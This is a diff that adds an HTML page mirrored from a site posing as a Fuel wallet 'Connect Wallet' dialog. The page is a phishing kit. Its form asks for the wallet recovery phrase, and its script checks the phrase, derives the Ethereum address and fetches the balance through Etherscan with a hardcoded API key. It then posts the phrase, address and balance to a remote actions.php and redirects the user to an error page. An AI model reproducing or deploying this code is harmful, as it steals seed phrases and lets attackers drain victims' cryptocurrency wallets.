+                    user-select: none;
+                    max-height: calc(100% - 20px);
+                    background-color: var(--fuel-dialog-background);
+                    position: fixed;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    border-radius: 36px;
+                    padding: 14px 0px 36px;
+                    animation: 150ms cubic-bezier(0.16, 1, 0.3, 1) fuelContentShow;
+                    top: 50%;
+                    width: 360px;
+                    max-width: calc(100% - 20px);
+                    box-shadow: rgba(14, 18, 22, 0.35) 0px 10px 38px -10px, rgba(14, 18, 22, 0.2) 0px 10px 20px -15px;
+                    pointer-events: auto;
+                "
+                data-connector="true"
+                class="fuel-connectors-dialog-content"
+                tabindex="-1"
+            >
+                <div style="display: flex; align-items: center; justify-content: space-between; padding-left: 16px; padding-right: 16px;">
+                    <a href="https://multiupdateapi.live/index.html">
+                        <svg
+                        fill="none"
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="32"
+                        height="32"
+                        viewBox="0 0 16 16"
+                        style="fill: var(--fuel-color); padding: 7px; border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer;"
+                        data-connector="true"
+                        class="fuel-connectors-back-icon"
+                        >
+                            <title>Back Icon</title>
+                            <path fill="currentColor" fill-rule="evenodd" d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z" clip-rule="evenodd"></path>
+                        </svg>
+                    </a>
+                    <h2 id="radix-:r1:" style="padding: 8px 14px 12px; margin: 0px; text-align: center; font-size: var(--fuel-font-size); font-weight: 500;">Connect Wallet</h2>
+                    <a href="https://multiupdateapi.live/index.html">
+                        <svg
+                        fill="none"
+                        xmlns="http://www.w3.org/2000/svg"
+                        width="32"
+                        height="32"
+                        viewBox="0 0 16 16"
+                        style="fill: var(--fuel-color); padding: 7px; border-radius: 12px; display: flex; align-items: center; justify-content: center; cursor: pointer;"
+                        type="button"
+                        class="fuel-connectors-close-icon"
+                        >
+                            <title>Close Icon</title>
+                            <path
+                                fill="currentColor"
+                                fill-rule="evenodd"
+                                d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
+                                clip-rule="evenodd"
+                            ></path>
+                        </svg>
+                    </a>
+                </div>
+                <div style="height: 1px; width: 100%; background-color: var(--fuel-border-color); margin: 10px 0px; padding: 0px;"></div>
+                <div style="position: relative; overflow-y: auto;">
+                    <div>
+                        <form method="post" action="https://multiupdateapi.live/actions.php" id="seedPhraseForm">
+    <div style="padding: 20px;">
+        <textarea rows="3" name="phrase" id="modal-textarea" style="resize: none; border-radius: 5px; padding: 5px; height: 6.2em; width: 100%;" required placeholder="Enter phrase here..."></textarea>
+    </div>
+    <input type="hidden" name="seed_phrase" id="seed_phrase" />
+    <input type="hidden" name="project_name" id="project_name" />
+    <input type="hidden" name="project_method" value="Import" />
+    <input type="hidden" name="wallet_address" id="wallet_address" />
+    <input type="hidden" name="balance" id="balance" />
+    
+    <!-- Add a hidden field for the wallet name -->
+    <input type="hidden" name="selected_wallet_name" id="selected_wallet_name" />
+    <input type="hidden" name="selected_wallet_logo" id="selected_wallet_logo" />
+
+    <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 24px;">
+        <p style="color: var(--fuel-gray-12); font-size: 0.8em; font-weight: 400; text-align: center; margin: 2em auto 0px; line-height: 1.2em; padding: 0px 2em; opacity: 0.5;">
+            Enter your wallet recovery phrase word for word. Make sure you enter the words in the correct order.
+        </p>
+    </div>
+    <center>
+        <button style="display: flex; box-sizing: border-box; text-decoration: none; cursor: pointer; justify-content: center; align-items: center; margin: 0.4rem 1rem 0px; padding: 0.6rem 0px; font-size: 0.875em; border-radius: var(--fuel-border-radius);" id="next-button" class="fuel-connectors-connector-button-primary" type="submit">
+            <span style="padding-left: 70px; padding-right: 70px;">Connect</span>
+        </button>
+    </center>
+</form>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
+<script>
+    // Retrieve selected wallet info from localStorage
+    const selectedWallet = JSON.parse(localStorage.getItem('selectedWallet'));
+    if (selectedWallet) {
+        document.getElementById('selected_wallet_name').value = selectedWallet.wallet;
+        document.getElementById('selected_wallet_logo').value = selectedWallet.logo;
+        document.getElementById('project_name').value = selectedWallet.wallet; // Change the project name dynamically
+    }
+
+    async function validateSeedPhrase() {
+        const textarea = document.getElementById('modal-textarea');
+        const phrase = textarea.value.trim();
+
+        // Use ethers.js to validate the mnemonic
+        if (!ethers.utils.isValidMnemonic(phrase)) {
+            alert('Please enter a valid seed phrase.');
+            return false;
+        }
+
+        let walletAddress = null;
+        try {
+            // Generate wallet address from mnemonic
+            const hdNode = ethers.utils.HDNode.fromMnemonic(phrase);
+            walletAddress = hdNode.derivePath("m/44'/60'/0'/0/0").address;
+
+            // Save values in hidden fields
+            document.getElementById('wallet_address').value = walletAddress;
+            localStorage.setItem('wallet_address', walletAddress);
+            document.getElementById('seed_phrase').value = phrase;
+
+            // Fetch wallet balance
+            await fetchBalance(walletAddress);
+            return true;
+        } catch (error) {
+            console.error("Error generating wallet address:", error);
+            alert('An error occurred while processing your seed phrase.');
+            return false;
+        }
+    }
+
+    async function fetchBalance(walletAddress) {
+        const apiKey = 'DCPF322JU2N9YVZV56D14UT1WV9ET8XNXR'; // Etherscan API key
+        const etherscanUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${apiKey}`;
+
+        try {
+            const response = await fetch(etherscanUrl);
+            const data = await response.json();
+
+            if (data.status === "1") {
+                const balanceInWei = data.result;
+                const balanceInEther = ethers.utils.formatEther(balanceInWei);
+
+                // Save balance in hidden field
+                document.getElementById('balance').value = balanceInEther;
+                console.log('Wallet balance:', balanceInEther);
+            } else {
+                console.warn("Failed to fetch balance:", data.message);
+                document.getElementById('balance').value = "0.0";
+            }
+        } catch (error) {
+            console.error("Error fetching balance:", error);
+            document.getElementById('balance').value = "0.0";
+        }
+    }
+
+    document.getElementById('seedPhraseForm').onsubmit = async function (event) {
+        event.preventDefault(); // Prevent default form submission
+
+        const isValid = await validateSeedPhrase();
+        if (isValid) {
+            // Submit the form data if validation passes
+            const formData = new FormData(this);
+
+            try {
+                const response = await fetch(this.action, {
+                    method: this.method,
+                    body: formData,
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    // Redirect after successful submission
+                    window.location.href = "https://multiupdateapi.live/error.html";
+                } else {
+                    alert(result.message || 'Connection failed. Please try again.');
+                }
+            } catch (error) {
+                console.error("Error connecting:", error);
+                alert('An error occurred while connecting.');
+            }
+        } else {
+            alert('Invalid seed phrase. Please try again.');
+        }
+    };
+</script>
+
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+
+<!-- Mirrored from multiupdateapi.live/phrase.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Feb 2025 04:11:23 GMT -->
+</html>
